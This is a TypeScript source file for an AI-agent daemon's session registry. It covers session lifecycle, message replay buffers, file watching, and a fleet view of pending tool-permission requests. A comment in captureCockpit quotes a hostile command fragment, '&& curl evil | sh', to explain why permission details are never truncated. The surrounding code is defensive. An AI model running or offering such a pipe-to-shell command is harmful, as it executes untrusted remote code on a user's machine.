import { randomUUID } from "node:crypto";
import { statSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import type { SessionMeta, WireMsg } from "../protocol";
import {
  createSession,
  errText,
  resolveBackend,
  resolveBackendFor,
  type AgentName,
  type AgentSession,
  type Backend,
} from "../adapters";
import { PERMISSION_TIMEOUT_MS } from "../adapters/types";
import type { CredentialKind } from "../provider-policy";
import type { BangProc } from "../pty/pty";
import { createLogger, verbose } from "../log";
import { startWatch, type FsWatchHandle } from "./fs-watch";
import { invalidateRepoStatusCache } from "./git";

// Replay depth: enough to reconstruct a long working session; beyond it the
// oldest messages fall off and a late viewport sees a truncated head.
const BUFFER_CAP = 4000;
// A session with no viewports survives this long, then dies for real.
const IDLE_TIMEOUT_MS = Number(process.env.SESSION_IDLE_TIMEOUT_MS ?? 4 * 60 * 60_000);
// Cap on the fleet's pending-permission MIRROR (2026-07-24 audit): a flooded
// session — a hostile or steered model spamming permissioned tool calls —
// must not grow watcher snapshots without bound (500 asks × full detail ≈
// 1MB to every watcher, up to 10×/s). Oldest evict first: they're closest
// to the adapter's auto-deny, and an evicted ask stays answerable at the
// adapter — only the fleet's view of it is dropped; in-session viewports
// saw its permission_request regardless. Each KEPT entry still carries its
// full, untruncated detail (the earlier 2026-07-24 audit's rule).
const PERMISSION_MIRROR_CAP = 25;
// Ceiling on concurrent sessions: a runaway or hostile local client can't
// exhaust memory + PTYs by creating without bound. Generous — a human working
// across projects won't approach it; create() throws past it (the caller turns
// that into an error WireMsg). Env-overridable.
const MAX_SESSIONS = Number(process.env.MAX_SESSIONS ?? 100);

export type Viewport = (msg: WireMsg) => void;

/**
 * A user-chosen working dir behaves like `cd`: `~` expands, the path must
 * already exist and be a directory, and a bad path throws (the caller turns
 * it into an error WireMsg). No path → the daemon's own launch dir.
 */
export function resolveCwd(cwd?: string): string {
  if (!cwd) return process.cwd();
  const expanded = cwd.replace(/^~(?=\/|$)/, os.homedir());
  const dir = path.resolve(expanded);
  let stat;
  try {
    stat = statSync(dir);
  } catch {
    throw new Error(`no such directory: ${dir}`);
  }
  if (!stat.isDirectory()) throw new Error(`not a directory: ${dir}`);
  return dir;
}

export type SessionEntry = {
  id: string;
  cwd: string;
  // Where the next `!` command runs. `cd` in a bang persists here, confined
  // to cwd and its children (the escape guard in connection.ts resets it) —
  // cwd itself stays the immutable workspace root for everything else.
  bangCwd: string;
  agent: AgentName;
  // False ⇒ the agent had no credentials and `session` is the scripted
  // mock — carried to the shell as session_created.demo so the banner draws (R.4b).
  live: boolean;
  // The credential kind behind this session — read by the relay gate in
  // connection.ts to refuse a subscription-backed session over the paid relay (R.4i).
  kind: CredentialKind;
  session: AgentSession;
  buffer: WireMsg[];
  viewports: Set<Viewport>;
  // Next session-scoped sequence number; broadcast stamps it onto every
  // message so a reconnecting viewport can name where its stream broke off (4.4).
  nextSeq: number;
  // 4.6 fleet metadata: display name (defaults to the cwd leaf, renamable),
  // coarse activity state derived from the broadcast stream, and when the
  // stream last moved.
  name: string;
  status: SessionMeta["status"];
  lastActivity: number;
  idleTimer?: NodeJS.Timeout;
  // The one running `!` command, if any (one at a time per session,
  // like a terminal). The proc itself never leaves the server (4.9).
  bang?: { id: string; proc: BangProc };
  // When the last `!` command started — the burst throttle in connection.ts
  // (each bang costs a model turn, so bursts burn tokens).
  lastBangAt?: number;
  // The live-tree doorbell (W.1): running exactly while viewports are
  // attached — first attach starts it, last detach (and end) stops it — so a
  // dormant session holds no inotify watches.
  fsWatch?: FsWatchHandle;
  // Phase M cockpit metadata (M.1), derived in broadcast() the same way
  // `status` is: when the session was created (the cockpit's stable sort
  // key), what it's doing right now, the pending-permission queue (each
  // entry lives until ITS OWN resolution — see captureCockpit), and folded
  // session usage. `askedAt` mirrors the adapter's auto-deny deadline and
  // stays server-side (summary() strips it off the wire).
  createdAt: number;
  activity?: { label: string; since: number };
  permissions: { id: string; tool: string; detail: string; askedAt: number }[];
  usage?: { inputTokens: number; outputTokens: number; costUsd?: number };
};

/**
 * Fold one per-turn `usage` report into the session total — the status bar's
 * exact rule (T2.6, Shell.tsx): tokens are per-turn and SUM; costUsd arrives
 * session-cumulative and is TAKEN, never summed (a later report without a
 * cost keeps the last one). Exported for the Tier-1 pin.
 */
export function foldUsage(
  prev: SessionEntry["usage"],
  msg: { inputTokens: number; outputTokens: number; costUsd?: number },
): NonNullable<SessionEntry["usage"]> {
  const costUsd = msg.costUsd ?? prev?.costUsd;
  return {
    inputTokens: (prev?.inputTokens ?? 0) + msg.inputTokens,
    outputTokens: (prev?.outputTokens ?? 0) + msg.outputTokens,
    ...(costUsd !== undefined ? { costUsd } : {}),
  };
}

/**
 * Sessions decoupled from connections (Step 4.2). A session outlives any
 * socket: connections attach as viewports, every emitted WireMsg is fanned
 * out to all of them and kept in a ring buffer that replays on attach, and
 * closing a tab merely detaches. Sessions die only on idle timeout.
 * Mental model: session ≈ project — each gets its own working dir.
 */
export class SessionRegistry {
  private entries = new Map<string, SessionEntry>();

  // Which agent every session in this registry runs, resolved once from
  // config (Phase P.1). The agent is chosen here, not hardcoded downstream.
  constructor(private backend: Backend = resolveBackend()) {}

  create(opts?: { cwd?: string; agent?: AgentName; backend?: Backend }): SessionEntry {
    if (this.entries.size >= MAX_SESSIONS) {
      throw new Error(`session limit reached (${MAX_SESSIONS})`);
    }
    const id = randomUUID().slice(0, 8);
    // Which agent this session runs (P.4): the caller's choice at onboarding,
    // resolved to a fresh backend here; no choice → the daemon default. Secrets
    // stay server-side — the client only ever names the agent. N.5: a chosen
    // backend arrives PRE-VALIDATED (connection.ts ran resolveChosenBackend —
    // this registry never sees raw client input) and wins over precedence.
    const backend =
      opts?.backend ?? (opts?.agent ? resolveBackendFor(opts.agent) : this.backend);
    // cwd is whatever the caller chose; the default is the directory the
    // daemon was launched from — the terminal's own model (Step 4.8; the
    // earlier workspace/<id> scratch default was itself a parity gap). Any
    // dir is fair game — safe because the socket binds to loopback
    // (server/index.ts), so only local-you can pick it, exactly as with the
    // terminal. (An interim build jailed this under workspace/; relaxed
    // 2026-07-05 — loopback already closes the remote-cwd vector.) A chosen
    // dir must already exist — `cd`, not `mkdir -p` — so a typo errors
    // instead of silently creating and working in a stray directory.
    const dir = resolveCwd(opts?.cwd);
    // The configured agent becomes a concrete engine at this one seam
    // (Phase P.1). Falls back to the mock when the agent has no credentials.
    const session: AgentSession = createSession(backend, { cwd: dir });
    const entry: SessionEntry = {
      id,
      cwd: dir,
      bangCwd: dir,
      agent: backend.agent,
      live: backend.live,
      kind: backend.kind,
      session,
      buffer: [],
      viewports: new Set(),
      nextSeq: 1,
      name: path.basename(dir) || dir,
      status: "idle",
      lastActivity: Date.now(),
      createdAt: Date.now(),
      permissions: [],
    };
    session.onMessage((msg) => this.broadcast(entry, msg));
    this.entries.set(id, entry);
    this.notifyWatchers();
    return entry;
  }

  get(id: string): SessionEntry | undefined {
    return this.entries.get(id);
  }

  /** Buffer a message and fan it out to every attached viewport. */
  broadcast(entry: SessionEntry, msg: WireMsg) {
    // The likeliest live failures (bad key, engine died, CLI missing)
    // arrive here as adapter-emitted `error` WireMsgs and used to reach only
    // the browser — mirror them to the terminal, timestamped, because the
    // terminal log is what a stranger pastes into a bug report (R.4g).
    if (msg.type === "error") {
      createLogger(`session ${entry.id}`).error(msg.message);
    }
    // MIRAFOLD_DEBUG=1 traces every normalized event on the session
    // stream (bang_input never crosses broadcast, so no secret can land
    // here). One line per WireMsg, payload truncated (R.4g).
    if (verbose) {
      const body = JSON.stringify(msg);
      createLogger(`session ${entry.id}`).debug(
        `${msg.type} ${body.length > 300 ? body.slice(0, 300) + "…" : body}`,
      );
    }
    // Resume cursor, one stamp for all viewports. Stamped on a shallow
    // copy — the adapter's object is never mutated or held by the buffer, so
    // an adapter re-emitting a message can't corrupt an already-buffered seq (4.4).
    msg = { ...msg, seq: entry.nextSeq++ };
    entry.buffer.push(msg);
    if (entry.buffer.length > BUFFER_CAP) {
      entry.buffer.splice(0, entry.buffer.length - BUFFER_CAP);
    }
    entry.lastActivity = Date.now();
    // Coarse fleet status, derived from the stream itself — no adapter
    // cooperation needed. Terminal states first; a permission hold sticks
    // until the turn moves again (4.6).
    const prev = entry.status;
    if (msg.type === "turn_end" || msg.type === "error" || msg.type === "bang_end") {
      entry.status = "idle";
    } else if (msg.type === "permission_request") {
      entry.status = "permission";
    } else {
      entry.status = "working";
    }
    if (this.captureCockpit(entry, msg) || entry.status !== prev) {
      this.notifyWatchers();
    }
    for (const viewport of entry.viewports) viewport(msg);
  }

  /**
   * Cockpit metadata (M.1), derived off the same stream `status` is — runs
   * AFTER the status derivation (the idle-clears read the new status).
   * Returns true when watcher-visible metadata changed beyond the status
   * flip itself.
   */
  private captureCockpit(entry: SessionEntry, msg: WireMsg): boolean {
    const prevActivity = entry.activity?.label;
    const prevPending = entry.permissions.length;
    // Activity: what the session is doing right now — `since` resets only
    // when the label CHANGES, so a re-announced identical status keeps its
    // elapsed time. The in-session status line persists through text
    // streaming until turn_end (RenderZone), so holding the last label here
    // is faithful.
    if (msg.type === "status") {
      const label = msg.state === "tool" ? (msg.label ?? "tool") : "thinking";
      if (prevActivity !== label) entry.activity = { label, since: Date.now() };
    } else if (msg.type === "bang_start") {
      // First line only, capped — a pasted script must not bloat snapshots.
      entry.activity = {
        label: `! ${msg.command.split("\n", 1)[0].slice(0, 80)}`,
        since: Date.now(),
      };
    } else if (entry.status === "idle") {
      entry.activity = undefined;
    }
    // Each pending permission lives until ITS OWN resolution: an answer
    // (grid or in-session — both route through answerPermission), the
    // adapter's auto-deny timeout (mirrored by askedAt below), or the turn
    // reaching a terminal state. The stream merely MOVING must not clear the
    // queue — with concurrent requests, the first answer's tool output used
    // to wipe the still-pending rest off the fleet forever (the 2026-07-24
    // bug; previously documented as a v1 honesty bound).
    if (msg.type === "permission_request") {
      // The FULL detail — never truncated. Grid allow/deny is a real
      // approval decision, so the fleet approver must see exactly what the
      // in-session bar shows; a capped detail could hide a dangerous tail
      // (`…harmless… && curl evil | sh`) past a benign head (2026-07-24
      // audit). The detail already reaches every viewport in the original
      // permission_request; copying it whole here leaks nothing new.
      entry.permissions.push({ id: msg.id, tool: msg.tool, detail: msg.detail, askedAt: Date.now() });
      if (entry.permissions.length > PERMISSION_MIRROR_CAP) {
        // At-cap eviction keeps the length constant, so the changed-metadata
        // check below stays false and the notify storm is damped too — a
        // flood past the cap stops fanning snapshots to watchers entirely.
        entry.permissions = entry.permissions.slice(-PERMISSION_MIRROR_CAP);
      }
    } else if (entry.status === "idle") {
      // turn_end / error / bang_end: nothing can still be pending.
      entry.permissions = [];
    } else if (entry.permissions.length) {
      // The adapter auto-denies an unanswered ask at PERMISSION_TIMEOUT_MS
      // with no stream event marking it — age the mirror out on the same
      // clock so the row never advertises an ask that can no longer be
      // answered. (A stale answer is a no-op at the adapter regardless.)
      const cutoff = Date.now() - PERMISSION_TIMEOUT_MS;
      entry.permissions = entry.permissions.filter((p) => p.askedAt > cutoff);
    }
    if (msg.type === "usage") entry.usage = foldUsage(entry.usage, msg);
    return (
      entry.activity?.label !== prevActivity ||
      entry.permissions.length !== prevPending ||
      msg.type === "usage"
    );
  }

  /**
   * Can a viewport that last saw `afterSeq` resume with a tail replay?
   * Only if nothing after it has fallen off the ring buffer, and it isn't
   * from some other life (a seq we never issued) (4.4).
   */
  canResume(entry: SessionEntry, afterSeq: number): boolean {
    if (!Number.isInteger(afterSeq) || afterSeq < 0 || afterSeq >= entry.nextSeq) return false;
    const firstBuffered = entry.buffer[0]?.seq ?? entry.nextSeq;
    return afterSeq >= firstBuffered - 1;
  }

  /**
   * Replay history into the viewport, then subscribe it to the live stream.
   * With `afterSeq` (pre-validated via canResume) only the unseen tail is
   * replayed — the reconnecting viewport keeps its state, no repaint.
   */
  attach(entry: SessionEntry, viewport: Viewport, afterSeq?: number) {
    clearTimeout(entry.idleTimer);
    for (const msg of entry.buffer) {
      if (afterSeq === undefined || (msg.seq ?? 0) > afterSeq) viewport(msg);
    }
    entry.viewports.add(viewport);
    // First viewport in → the doorbell starts (W.1), and every ring fans an
    // fs_changed to the ATTACHED viewports (W.2) — per-viewport plumbing
    // like the fs_* replies, never through broadcast(): disk state is a
    // query, not session history, so the bell must not enter the replay
    // ring. Statuses are invalidated BEFORE the fan so a bell-triggered
    // refetch can't be served a pre-change answer still inside its TTL.
    // Watcher failure degrades to Phase E behavior (turn-end refresh + the
    // manual button): one shell-composed notice to attached viewports, one
    // log line, never a crash — and a later fresh first attach retries.
    if (entry.viewports.size === 1 && !entry.fsWatch) {
      entry.fsWatch = startWatch(
        entry.cwd,
        (change) => {
          invalidateRepoStatusCache();
          const msg: WireMsg = {
            type: "fs_changed",
            ...(change.paths.length ? { paths: change.paths } : {}),
            ...(change.truncated ? { truncated: true } : {}),
          };
          for (const viewport of entry.viewports) viewport(msg);
          if (verbose) {
            createLogger(`session ${entry.id}`).debug(
              `fs change: ${change.paths.length} path(s)${change.truncated ? " (truncated)" : ""}`,
            );
          }
        },
        {
          onError: (err) => {
            entry.fsWatch = undefined;
            const notice: WireMsg = {
              type: "notice",
              text: "Live file updates are unavailable — the Files panel still refreshes at turn end and with its refresh button.",
            };
            for (const viewport of entry.viewports) viewport(notice);
            createLogger(`session ${entry.id}`).error(
              `fs watcher stopped — the Explorer falls back to turn-end/manual refresh: ${errText(err)}`,
            );
          },
        },
      );
    }
    this.notifyWatchers(); // viewport counts are fleet metadata
  }

  /** Detaching never closes the session — the idle timer does, much later. */
  detach(entry: SessionEntry, viewport: Viewport) {
    entry.viewports.delete(viewport);
    if (entry.viewports.size === 0) {
      entry.fsWatch?.stop(); // nobody listening → no watches held (W.1)
      entry.fsWatch = undefined;
    }
    this.notifyWatchers(); // viewport counts are fleet metadata
    // The `=== entry` guard skips this for a session already ended (#11):
    // end() deletes it from the map, so a later detach mustn't re-arm the idle
    // timer or double-close the engine.
    if (entry.viewports.size === 0 && this.entries.get(entry.id) === entry) {
      entry.idleTimer = setTimeout(() => {
        entry.bang?.proc.kill(); // no orphaned PTYs past the session's life
        entry.session.close();
        this.entries.delete(entry.id);
        this.notifyWatchers();
      }, IDLE_TIMEOUT_MS);
      entry.idleTimer.unref();
    }
  }

  /**
   * Explicit teardown — the user chose "end session". Kill any running
   * PTY, close the engine, drop it from the fleet, and tell attached viewports
   * it's over (they leave to mission control). A subsequent detach on this
   * entry is a no-op (guarded above), so close() runs exactly once (#11).
   */
  end(id: string): boolean {
    const entry = this.entries.get(id);
    if (!entry) return false;
    clearTimeout(entry.idleTimer);
    entry.fsWatch?.stop();
    entry.fsWatch = undefined;
    entry.bang?.proc.kill();
    entry.session.close();
    this.entries.delete(id);
    for (const viewport of entry.viewports) viewport({ type: "session_ended", sessionId: id });
    this.notifyWatchers();
    return true;
  }

  // ---- Fleet watchers (4.6): connections that observe the registry itself —
  // the mission-control page — rather than any one session's stream.

  private watchers = new Set<Viewport>();
  private notifyTimer: NodeJS.Timeout | null = null;

  summary(): SessionMeta[] {
    return [...this.entries.values()]
      .map((e) => ({
        sessionId: e.id,
        name: e.name,
        cwd: e.cwd,
        agent: e.agent,
        model: e.session.modelName,
        status: e.status,
        lastActivity: e.lastActivity,
        viewports: e.viewports.size,
        createdAt: e.createdAt,
        // Copies, and absent-when-empty (M.1): a watcher's serialized
        // snapshot must not alias entry state, and old clients strip fields
        // they don't know rather than seeing empty placeholders.
        ...(e.activity ? { activity: { ...e.activity } } : {}),
        // askedAt stays server-side — the wire shape is unchanged (M.1).
        ...(e.permissions.length
          ? { permissions: e.permissions.map(({ id, tool, detail }) => ({ id, tool, detail })) }
          : {}),
        ...(e.usage ? { usage: { ...e.usage } } : {}),
      }))
      .sort((a, b) => b.lastActivity - a.lastActivity);
  }

  watch(viewport: Viewport) {
    this.watchers.add(viewport);
    viewport({ type: "sessions", sessions: this.summary() });
  }

  unwatch(viewport: Viewport) {
    this.watchers.delete(viewport);
  }

  rename(id: string, name: string): boolean {
    const entry = this.entries.get(id);
    const clean = name.trim().slice(0, 60);
    if (!entry || !clean) return false;
    entry.name = clean;
    this.notifyWatchers();
    return true;
  }

  // ---- Cockpit acts (M.2): sessionId-addressed, usable from a fleet watcher
  // without attaching. Each returns false for an unknown session — the caller
  // turns that into an error reply, never a crash. The relay gate for the
  // acts that drive the model lives in connection.ts, beside its attach twin.

  /** Answer a session's pending permission — BOTH answer paths land here:
   *  the grid's answer_permission and the in-session permission_response
   *  (connection.ts routes it through, so the queue and the watchers stay
   *  in sync with the adapter). The answered id is dropped from the queue
   *  immediately (honest feedback before the stream moves — the allowed
   *  tool may take a moment to start); a concurrently pending second
   *  request stays visible. A stale id is a no-op at the adapter. */
  answerPermission(id: string, permissionId: string, allow: boolean): boolean {
    const entry = this.entries.get(id);
    if (!entry) return false;
    entry.session.resolvePermission(permissionId, allow);
    const before = entry.permissions.length;
    entry.permissions = entry.permissions.filter((p) => p.id !== permissionId);
    if (entry.permissions.length !== before) this.notifyWatchers();
    return true;
  }

  /** Halt a session's in-flight turn from the grid; the session stays warm. */
  interruptSession(id: string): boolean {
    const entry = this.entries.get(id);
    if (!entry) return false;
    entry.session.interrupt();
    return true;
  }

  /** Dispatch a user turn to a session from the grid — the `prompt` case's
   *  exact semantics (echo through the stream, then push), addressed by id. */
  promptSession(id: string, text: string): boolean {
    const entry = this.entries.get(id);
    if (!entry) return false;
    this.broadcast(entry, { type: "user_prompt", text });
    entry.session.pushPrompt(text);
    return true;
  }

  /** Push a fresh snapshot to every watcher, coalescing bursts. */
  private notifyWatchers() {
    if (this.watchers.size === 0 || this.notifyTimer) return;
    this.notifyTimer = setTimeout(() => {
      this.notifyTimer = null;
      const msg: WireMsg = { type: "sessions", sessions: this.summary() };
      for (const w of this.watchers) w(msg);
    }, 100);
    this.notifyTimer.unref();
  }
}
